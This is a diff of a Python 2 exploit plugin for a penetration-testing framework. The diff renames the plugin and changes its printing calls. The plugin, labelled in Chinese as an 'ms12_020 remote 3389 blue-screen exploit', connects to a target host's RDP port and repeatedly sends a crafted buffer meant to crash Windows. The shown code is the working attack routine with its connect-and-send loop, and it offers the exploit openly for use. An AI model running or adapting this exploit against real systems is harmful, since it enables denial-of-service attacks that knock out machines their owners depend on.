@@ -1,17 +1,17 @@
-
-# -*- coding: cp936 -*-
+# -*- coding:utf-8 -*-
 '''
-mst=>plugin=>exploit
+nss=>plugin=>exploit
 ms12_020
 '''
 from socket import *
-class mstplugin:
+
+class NSSPlugin:
     '''ms12_020'''
     infos = [
         ['插件','ms12_020 远程3389蓝屏Exploit'],
-        ['作者','mst'],
-        ['更新','2013/10/22'],
-        ['网址','http://mstoor.duapp.com/']
+        ['作者','nss'],
+        ['更新','2014/07/14'],
+        ['网址','http://jadore.wang/']
         ]
     opts  = [
         ['RHOST','192.168.1.2','REMOTE HOST'],
@@ -96,16 +96,16 @@ class mstplugin:
     buf+="\x00\x12\x34\x00"
     def exploit(self):
         '''start exploit'''
-        color.cprint("[+] Connect to %s .."%RHOST,YELLOW)
+        pp.prettyPrint("[+] Connect to %s .."%RHOST,YELLOW)
         for i in range(int(TIMES)):
-            s=socket(AF_INET,SOCK_STREAM)
+            s = socket(AF_INET,SOCK_STREAM)
             s.settimeout(int(TIMEOUT))
             try:
                 s.connect((RHOST,int(RPORT)))
-                color.cprint("[+] Send %-5s Bytes.."%len(self.buf),GREEN)
+                pp.prettyPrint("[+] Send %-5s Bytes.."%len(self.buf),GREEN)
                 s.send(self.buf)
-                rec=s.recv(100)
-                color.cprint("[+] Recv %-5s Bytes.."%len(rec),YELLOW)
+                rec = s.recv(100)
+                pp.prettyPrint("[+] Recv %-5s Bytes.."%len(rec),YELLOW)
                 s.close()
             except Exception,e:
-                color.cprint("[!] Exploit False !CODE:%s"%e,RED)
+                pp.prettyPrint("[!] Exploit False !CODE:%s"%e,RED)
